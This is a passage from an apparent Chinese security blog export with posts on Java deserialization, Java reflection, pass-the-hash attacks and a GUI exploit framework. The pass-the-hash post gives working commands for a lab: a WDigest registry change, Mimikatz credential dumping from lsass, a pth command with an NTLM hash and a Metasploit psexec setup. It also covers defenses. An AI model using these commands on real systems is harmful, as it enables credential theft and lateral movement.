Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p>
<p><strong>序列化和反序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">o</span> <span class="operator">=</span> (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211527.png" alt="image-20210405000541157"></p>
<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p>
<ol>
<li>反序列化入口(source)</li>
<li>目标方法(sink)</li>
<li>利用链(gadget chain)</li>
</ol>
<p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p>
<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
<p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Java反序列化漏洞(二)</title>
    <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    <content><![CDATA[<blockquote>
<p>  不能食言，再晚也要写</p>
</blockquote>
<h2 id="0x01-Java反射"><a href="#0x01-Java反射" class="headerlink" title="0x01 Java反射"></a>0x01 Java反射</h2><p>反射之中包含了一个「反」字，有「反」就会有「正」，那么解释反射就必须先从「正」开始解释。</p>
<p>一般情况下，当使用某个类时必定知道它是什么类（类名），是用来做什么的（类的属性和方法）。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">System.out.println(user.getName());</span><br></pre></td></tr></table></figure>

<p>“正射”就是通过new创建了一个<strong>User</strong>实例，然后通过实例(user)去调用其所属方法。</p>
<p>但是当你<strong>new</strong>的时候不知道类名怎么办？受<strong>private</strong>保护的方法怎么调用？这时候反射的作用就体现出来了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clz.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// setName(&quot;yhy&quot;)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">method.invoke(object, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// getName()</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">name</span> <span class="operator">=</span> clz.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> name.invoke(object, <span class="literal">null</span>);</span><br><span class="line">System.out.println(o1);</span><br></pre></td></tr></table></figure>

<p>上面两段代码的执行结果，是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（User），而第二段代码则是在运行时通过字符串值才得知要运行的类（yhy.reflect.User）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224435.png"></p>
<p>所以说什么是反射？</p>
<p><strong>反射就是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。</strong></p>
<p>java反射机制给漏洞利用提供了很多便利，我们可以在很多java漏洞的exp中看到它的影子，所以，学习java安全是绕不开它的。</p>
<blockquote>
<p>  Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p>
</blockquote>
<h2 id="0x02-反射常用API"><a href="#0x02-反射常用API" class="headerlink" title="0x02 反射常用API"></a>0x02 反射常用API</h2><h3 id="2-1-获取Class对象"><a href="#2-1-获取Class对象" class="headerlink" title="2.1 获取Class对象"></a>2.1 获取Class对象</h3><p>在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。</p>
<p>在 Java API 中，获取 Class 类对象有三种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.通过字符串获取Class对象，这个字符串必须带上完整路径名</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="comment">// 2.通过类的class属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> User.class;</span><br><span class="line"><span class="comment">// 3.通过对象的getClass()函数</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> user.getClass();</span><br></pre></td></tr></table></figure>

<ul>
<li>第一种方法是通过类的全路径字符串获取 Class 对象，这也是平时最常用的反射获取 Class 对象的方法；</li>
<li>第二种方法有限制条件：需要导入类的包；</li>
<li>第三种方法已经有了 User 对象，不再需要反射。</li>
</ul>
<h3 id="2-2-通过反射创建类对象"><a href="#2-2-通过反射创建类对象" class="headerlink" title="2.2 通过反射创建类对象"></a>2.2 通过反射创建类对象</h3><p>通过反射创建类对象主要有两种方式：</p>
<p><strong>第一种：通过 Class 对象的 newInstance() 方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clz.newInstance();</span><br></pre></td></tr></table></figure>

<p><strong>第二种：通过 Constructor 对象的 newInstance() 方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>通过 <strong>Constructor</strong> 对象创建类对象可以选择特定构造方法，而通过 <strong>Class</strong> 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor(String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;yhy&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-3-通过反射获取类属性、方法、构造器"><a href="#2-3-通过反射获取类属性、方法、构造器" class="headerlink" title="2.3 通过反射获取类属性、方法、构造器"></a>2.3 通过反射获取类属性、方法、构造器</h3><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224545.png"></p>
<p>两个属性：一个<strong>公有(age)<strong>，一个</strong>私有(Name)</strong></p>
<p>我们通过 <strong>Class</strong> 对象的 <strong>getFields()</strong> 方法可以获取 Class 类的属性，但无法获取私有属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line">Field[] fields = clz.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224502.png"></p>
<p>而如果使用 <strong>Class</strong> 对象的 **getDeclaredFields() **方法则可以获取包括私有属性在内的所有属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;yhy.reflect.User&quot;</span>);</span><br><span class="line">Field[] fields = clz.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210502224558.png"></p>
<p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有声明的构造方法</span></span><br><span class="line">getDeclaredConstructors()</span><br><span class="line"><span class="comment">// 获取所有公有的构造方法</span></span><br><span class="line">getConstructors()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有声明的方法</span></span><br><span class="line">getDeclaredMethods()</span><br><span class="line"><span class="comment">// 获取所有公有的函数</span></span><br><span class="line">getMethods()</span><br></pre></td></tr></table></figure>

<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>哈希传递</title>
    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
</blockquote>
<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
<p>将一台win7添加到域控（win8）中</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
<p>切换本地账户</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
<p>获取终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
<blockquote>
<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
</blockquote>
<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>图形化漏洞利用Demo-JavaFX版</title>
    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
    <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便、直观。</p>
<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具，建立自己的漏洞利用库。</p>
<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>经过多次改版，这是最终(?)的效果。详细见<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
    <source src="/img/SJ.mp4" type="video/mp4">
</video>

<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── ExpDemo-JavaFX.iml</span><br><span class="line">├── logs          运行日志文件</span><br><span class="line">│   ├── debug.log</span><br><span class="line">│   └── error.log</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        ├── java</span><br><span class="line">        │   └── fun</span><br><span class="line">        │       └── fireline</span><br><span class="line">        │           ├── AppStartUp.java    应用程序启动入口</span><br><span class="line">        │           ├── controller    控制JavaFX图形化界面的各种显示、事件等，核心代码 </span><br><span class="line">        │           │   ├── MainController.java  主界面的controller，负责切换界面和基本信息显示</span><br><span class="line">        │           │   ├── OAController.java   OA漏洞利用切换界面的相关逻辑</span><br><span class="line">        │           │   ├── OthersController.java  其他漏洞界面的相关逻辑</span><br><span class="line">        │           │   ├── Struts2Controller.java  Struts2漏洞利用界面的相关逻辑</span><br><span class="line">        │           │   └── oa      OA漏洞利用的相关逻辑</span><br><span class="line">        │           │       └── OASeeyonController.java</span><br><span class="line">        │           ├── core     核心代码文件夹</span><br><span class="line">        │           │   ├── Constants.java   一些常量基本信息</span><br><span class="line">        │           │   ├── ExploitInterface.java   exp 编写要实现的接口</span><br><span class="line">        │           │   ├── Job.java    一种漏洞全部检查的类</span><br><span class="line">        │           │   └── VulInfo.java</span><br><span class="line">        │           ├── exp			各种 exp 实现类</span><br><span class="line">        │           │   ├── apache</span><br><span class="line">        │           │   │   └── struts2</span><br><span class="line">        │           │   │       ├── S2_005.java</span><br><span class="line">        │           │   │       ├── S2_009.java</span><br><span class="line">        │           │   │       ├── S2_016.java</span><br><span class="line">        │           │   │       ├── S2_019.java</span><br><span class="line">        │           │   │       ├── S2_032.java</span><br><span class="line">        │           │   │       ├── S2_045.java</span><br><span class="line">        │           │   │       ├── S2_046.java</span><br><span class="line">        │           │   │       └── S2_DevMode.java</span><br><span class="line">        │           │   ├── cms</span><br><span class="line">        │           │   │   └── nc</span><br><span class="line">        │           │   │       └── CNVD_2021_30167.java</span><br><span class="line">        │           │   ├── oracle</span><br><span class="line">        │           │   │   └── CVE_2020_14882.java</span><br><span class="line">        │           │   └── others</span><br><span class="line">        │           │       └── CVE_2021_22986.java</span><br><span class="line">        │           └── tools  工具文件夹</span><br><span class="line">        │               ├── HttpTool.java  HTTP 请求封装</span><br><span class="line">        │               ├── MyCERT.java    HTTPS 请求证书设置</span><br><span class="line">        │               └── Tools.java     一些处理函数</span><br><span class="line">        └── resources    资源文件夹</span><br><span class="line">            ├── css      界面css样式表</span><br><span class="line">            │   └── main.css</span><br><span class="line">            ├── fxml    界面的设计文件</span><br><span class="line">            │   ├── Main.fxml</span><br><span class="line">            │   ├── OA.fxml</span><br><span class="line">            │   ├── Others.fxml</span><br><span class="line">            │   ├── Struts2.fxml</span><br><span class="line">            │   ├── Weblogic.fxml</span><br><span class="line">            │   └── oa</span><br><span class="line">            │       ├── OA-E-office.fxml</span><br><span class="line">            │       ├── OA-Kingdee.fxml</span><br><span class="line">            │       ├── OA-Landray.fxml</span><br><span class="line">            │       └── OA-Seeyon.fxml</span><br><span class="line">            ├── img</span><br><span class="line">            │   ├── sec.png</span><br><span class="line">            │   └── weixin.jpg</span><br><span class="line">            └── log4j.properties   日志相关设置</span><br></pre></td></tr></table></figure>

<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
<ul>
<li>checkVUL		使用poc 检查是否漏洞</li>
<li>exeCMD          使用exp执行命令</li>
<li>uploadFile        使用命令执行 写webshell，上传文件</li>
<li>getWebPath     获取网站的web目录，供上传文件使用</li>
<li>isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
</ul>
<p>EXP具体编写请参考 <code>fun/fireline/exp</code> 下的各种漏洞实现</p>
<p>当编写完EXP后，转到 <code>fun/fireline/controller</code> 下对应的<strong>xxController.java</strong>文件，比如新编写了Struts2的相关漏洞，修改<strong>Struts2Controller.java</strong>的<strong>STRUTS2</strong>变量，新加入一个漏洞名称，这里对应的是图像化界面中可供选择的漏洞列表</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
<p>之后进入和 <code>fun/fireline/tools/Tools.java</code> 的<strong>getExploit</strong>方法中新增一个<strong>else if</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
<p>编写完后，可以直接执行<code>fun/fireline/AppStartUp.java</code>类, 查看是否正常运行。</p>
<p>开发过程中每次修改完运行前，最好将生成的<strong>target</strong>目录删除再运行</p>
<h4 id="3-3-新增漏洞页面"><a href="#3-3-新增漏洞页面" class="headerlink" title="3.3 新增漏洞页面"></a>3.3 新增漏洞页面</h4><p>具体请看<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
